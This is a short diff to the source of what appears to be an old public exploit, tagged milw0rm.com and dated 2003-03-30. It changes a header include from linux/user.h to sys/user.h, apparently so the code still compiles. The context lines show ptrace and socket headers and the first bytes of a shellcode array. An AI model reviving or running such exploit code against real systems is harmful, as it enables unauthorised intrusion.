@@ -34,7 +34,8 @@
 #include <sys/types.h>
 #include <sys/ptrace.h>
 #include <sys/socket.h>
-#include <linux/user.h>
+/* #include <linux/user.h> */
+#include <sys/user.h>
 
 char cliphcode[] =
 	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
@@ -181,5 +182,6 @@ int main(int argc, char ** argv)
 
 	return 0;
 }
+
 
 // milw0rm.com [2003-03-30]
